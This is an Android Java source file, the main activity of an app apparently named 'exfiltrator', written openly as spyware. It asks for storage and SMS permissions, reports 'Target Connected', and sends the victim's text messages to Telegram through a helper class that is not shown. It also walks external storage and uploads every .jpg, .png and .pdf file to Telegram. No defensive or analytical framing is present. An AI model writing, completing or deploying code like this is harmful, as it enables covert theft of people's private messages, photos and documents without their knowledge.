package com.example.exfiltrator;

import android.Manifest;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Environment;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.io.File;

public class MainActivity extends AppCompatActivity {
    private static final int REQUEST_CODE = 123;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED ||
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.READ_SMS
            }, REQUEST_CODE);
        } else {
            startExfiltration();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_CODE && grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            startExfiltration();
        }
    }

    private void startExfiltration() {
        TelegramExfiltrator.sendTextToTelegram("Target Connected. Starting exfiltration...");
        TelegramExfiltrator.readSmsAndSend(this);

        File storage = Environment.getExternalStorageDirectory();
        traverseAndSend(storage);
    }

    private void traverseAndSend(File dir) {
        File[] files = dir.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    traverseAndSend(file);
                } else if (file.getName().endsWith(".jpg") || file.getName().endsWith(".png") || file.getName().endsWith(".pdf")) {
                    TelegramExfiltrator.sendFileToTelegram(file);
                }
            }
        }
    }
}
